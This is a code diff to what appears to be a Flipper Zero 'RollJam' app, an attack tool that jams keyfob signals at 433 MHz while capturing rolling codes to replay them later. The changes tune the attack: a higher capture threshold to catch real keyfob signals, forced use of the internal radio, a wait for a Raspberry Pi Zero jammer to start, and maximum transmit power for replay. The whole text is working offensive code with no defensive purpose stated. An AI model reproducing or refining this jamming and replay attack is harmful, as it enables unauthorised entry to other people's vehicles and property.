@@ -90,7 +90,7 @@ static void rj_beacon_off(void) {
 #define ROLLJAM_RX_WINDOW_MS    60
 #define ROLLJAM_RX_EXTEND_MS    80
 #define ROLLJAM_MAX_SESSION_MS  15000
-#define ROLLJAM_RX_MIN_EDGES    80
+#define ROLLJAM_RX_MIN_EDGES    300  /* alto per ignorare rumore, richiede vero keyfob */
 #define ROLLJAM_MAX_TIMINGS     2048
 
 #define FOB_TIMING_MIN_US       40
@@ -288,17 +288,12 @@ static bool radio_init_for_attack(RollJamApp* app) {
              (void*)app->device, (void*)app->txrx_worker);
     log_add(_dbg_init);
 
-    /* Init external device if not done yet */
+    /* FORZA INTERNAL CC1101 — TX 10mW stabile, no external board, no OTG */
     if(!app->device) {
-        app->device = radio_device_loader_set(NULL, SubGhzRadioDeviceTypeExternalCC1101);
-        if(app->device) {
-            app->device_is_external = true;
-            log_add("EXT CC1101 found");
-        } else {
-            app->device = radio_device_loader_set(NULL, SubGhzRadioDeviceTypeInternal);
-            app->device_is_external = false;
-            log_add("EXT not found, using INTERNAL");
-        }
+        if(furi_hal_power_is_otg_enabled()) furi_hal_power_disable_otg();
+        app->device = radio_device_loader_set(NULL, SubGhzRadioDeviceTypeInternal);
+        app->device_is_external = false;
+        log_add("FORCED INTERNAL CC1101 (10mW max stable)");
     }
     if(!app->device) {
         log_add("radio_init FAILED: no device");
@@ -537,6 +532,12 @@ static bool run_attack(RollJamApp* app) {
     log_add("=== ATTACK START ===");
     rj_beacon_set(RJ_BEACON_STATE_ON_433);  /* segnale a Pi Zero: jam ON 433 MHz */
     log_add("BEACON ON_433");
+    /* Attendi 2s che pichirp Pi Zero parta — startup rpitx ~1.5s */
+    log_add("waiting 2s pichirp warmup");
+    log_flush(g_log_storage);
+    furi_delay_ms(2000);
+    log_add("warmup done, starting RX");
+    log_flush(g_log_storage);
     app->should_abort = false;
     app->jam_count = 0;
 
@@ -633,13 +634,15 @@ static void do_replay(RollJamApp* app) {
     app->replay_index = 0;
     app->replay_done = false;
 
-    /* Replay: re-inizializza explicit preset+PATABLE prima async_tx per full 1W
-     * (worker precedente può aver modificato stato) */
+    /* Replay: re-inizializza preset + force PATABLE max +10 dBm per internal CC1101 */
     subghz_devices_reset(app->device);
     subghz_devices_idle(app->device);
     subghz_devices_load_preset(app->device, FuriHalSubGhzPresetOok650Async, NULL);
     subghz_devices_set_frequency(app->device, ROLLJAM_FREQ_RX);
-    log_add("REPLAY preset+freq set");
+    /* Force PATABLE max (0xC0 = +10 dBm) — ridondante ma garantisce TX consistente */
+    static const uint8_t patable_max[8] = {0xC0, 0, 0, 0, 0, 0, 0, 0};
+    furi_hal_subghz_load_patable(patable_max);
+    log_add("REPLAY preset+freq+PATABLE_MAX set");
 
     if(!subghz_devices_start_async_tx(app->device, replay_tx_callback, app)) {
         set_status(app, "TX denied");
